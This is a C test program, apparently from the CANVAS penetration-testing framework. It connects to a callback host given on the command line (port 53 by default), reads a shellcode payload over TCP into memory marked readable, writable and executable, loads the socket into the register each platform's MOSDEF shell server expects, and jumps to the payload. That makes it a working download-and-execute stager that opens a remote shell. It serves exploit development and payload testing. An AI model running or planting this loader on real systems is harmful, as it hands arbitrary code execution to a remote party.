//sample vulnerable program for CANVAS
//c: dave aitel
#include <stdio.h>
#include <stdlib.h>

//for win32 do gcc -o testvuln1.exe testvuln1.c tcpstuff.c utils.c -DWINDOWS -mno-cygwin -lws2_32
#if !defined(WINDOWS) && (defined(__CYGWIN__) || defined(WIN32))
#define WINDOWS
#endif

#include "tcpstuff.h"
#include "utils.h"

#ifdef WINDOWS
  #include <windows.h>
#else
  #include <sys/mman.h>
#endif

int
main(int argc, char**argv)
{
  int fd;
  unsigned int insize;
  // unsigned char buf[5000];
  char *buf = NULL;
#ifdef WIN64
  char *buf2 = NULL;
#endif
  char *cbhost = "localhost"; //callback host
  int port;
  port=53;

  if (argc > 1)
    cbhost=argv[1];
  if (argc > 2)
    port=atoi(argv[2]);

  #ifdef WINDOWS
  {
    WSADATA WSAData;
  if (WSAStartup (MAKEWORD(2,2), &WSAData) != 0) {
      printf("No WSAStartup!\n");
      exit(1);
    }
  }
  #endif
  //allocate a rwx block of memory for MOSDEF to crawl into
#ifdef WIN32
  printf("VirtualAlloc\n");
  buf = VirtualAlloc(0, 100000, 0x1000, 0x40);
#else
  // mmap RWX memory to ensure mosdef works
  //buf = malloc(100000);
  //if (buf)
  //  if (!mprotect(buf, 100000, PROT_READ|PROT_WRITE|PROT_EXEC))
  //    printf("[+] could not mprotect to RWX ... will fail on NX support\n");
  buf = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
#endif

  if (!buf)
  {
    printf("couldn't alloc.\n");
    exit(2);
  }

  fd=tcpconnect(cbhost,port,0);
  if (fd==-1) {
    printf("couldn't connect.\n");
    exit(2);
  }

  if (!tcpread(fd,4,buf)) { exit(3); };
  insize=*((unsigned int *)buf);
  if (insize==0) {
      printf("Some sort of failure...\n");
      exit(4);
  }
  printf("Reading %d bytes\n",insize);
  if (!tcpread(fd,insize,buf)) { exit(5); };
  bufferdump(buf, insize);
  printf("Executing shellcode at %p\n", buf);

  #ifdef WINDOWS
	#ifdef WIN64
		buf2 = &buf[ insize + 16 ];
		memcpy( buf2, "\x48\x89\xce\xc3", 4 );
		((void(*)( int ))(buf2)) ( fd);
		
  // [0x48][0x89][0x74][0x24][0x08][0xc3]

	#else
	  /* win32MosdefShellServer expects fd in %esi */
	  asm volatile ("movl %0, %%esi" : : "g" (fd) : "%esi");
	#endif
  #endif
  #if (defined(__linux__)||defined(__FreeBSD__)||defined(sun)) && defined(__i386__)
  /* linuxMosdefShellServer and bsdMosdefShellServer expect fd in %ebx */
  asm volatile ("movl %0, %%ebx" : : "g" (fd) : "%ebx");
  #endif
  #if defined(sun) && defined(__sparc__)
  /* solarisMosdefShellServer expects fd in %g4 */
  asm volatile ("ld %0, %%g4" : : "g" (fd) : "%g4"); // we have the longjmp as load delay
  #endif
  #if defined(__APPLE__) && defined(__ppc__)
  /* osxMosdefShellServer expects fd in %r30, but gcc use %r30 to optimize, so we will randomly use %r24 by now */
  asm volatile ("lwz r24, %0" : : "g" (fd) : "r24");
  #endif

    /* fd in r30 and flush cache to jump to buf */
    #if defined(__AIX__)
        sync();
        __asm__ volatile (  "lwz 30, %0     \n\t"
                            "mtlr %1        \n\t"
                            "blr            \n\t"
                            :
                            : "g" (fd), "r" (buf)   );
    #endif

  ((void(*)())(buf)) ();
  // not reached
  return 0;
}

